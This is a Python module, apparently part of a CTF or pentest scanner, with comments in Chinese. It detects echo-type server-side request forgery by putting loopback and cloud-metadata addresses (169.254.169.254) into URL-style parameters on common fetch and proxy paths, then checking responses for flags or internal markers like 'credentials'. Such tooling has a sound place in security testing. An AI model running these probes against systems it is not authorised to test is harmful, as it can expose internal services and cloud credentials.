"""SSRF 检测：URL 类参数替换为内网探测地址，观察响应差异。

盲 SSRF 无法直接回显（需 DNS 回调），P1 只测回显型：替换后响应中出现内网服务特征。
"""
from __future__ import annotations

from ..common import Candidate, body_of, extract_flag, get

URL_PARAM_NAMES = ["url", "u", "uri", "link", "src", "source", "redirect", "target",
                   "dest", "path", "fetch", "proxy", "img", "image", "file"]

PROBES = [
    ("http://127.0.0.1/", "本地回环"),
    ("http://127.0.0.1:80/", "本地回环"),
    ("http://localhost/", "localhost"),
    ("http://169.254.169.254/", "云元数据"),
    ("http://[::1]/", "IPv6 回环"),
]

# 内网服务特征（响应中含 → 证明请求确实打到了内网）
INTRANET_MARKERS = ["tomcat", "nginx", "apache", "iis", "homeassistant",
                    "actuator", "meta-data", "iam", "credentials"]


def run(ctx) -> list[Candidate]:
    out: list[Candidate] = []
    base = ctx["base"].rstrip("/")
    for path in ("/fetch", "/proxy", "/load", "/image", "/img", "/api/fetch",
                 "/api/proxy", "/redirect", "/go"):
        if ctx["time_left"]() <= 0:
            break
        for pname in URL_PARAM_NAMES:
            if ctx["time_left"]() <= 0:
                break
            for probe, label in PROBES:
                if ctx["time_left"]() <= 0:
                    break
                r = get(base + path, ctx["timeout"], params={pname: probe})
                if r is None:
                    continue
                body = body_of(r).lower()
                flag = extract_flag(body_of(r))
                if flag:
                    out.append(Candidate(
                        type="ssrf", url=f"{base}{path}?{pname}={probe}",
                        request=f"GET {path}?{pname}=<url>",
                        response=body_of(r)[:300],
                        impact=f"SSRF 请求内网地址后泄露 flag",
                        confidence=0.95, value=flag,
                        confirm={"note": f"探测 {label} 命中 flag"},
                    ))
                    return out
                if any(m in body for m in INTRANET_MARKERS):
                    out.append(Candidate(
                        type="ssrf", url=f"{base}{path}?{pname}={probe}",
                        request=f"GET {path}?{pname}=<url>",
                        response=body[:300],
                        impact=f"SSRF：{label} 可达（响应含内网服务特征）",
                        confidence=0.75,
                        confirm={"note": f"探测 {label} 返回内网特征"},
                    ))
                    return out
    return out
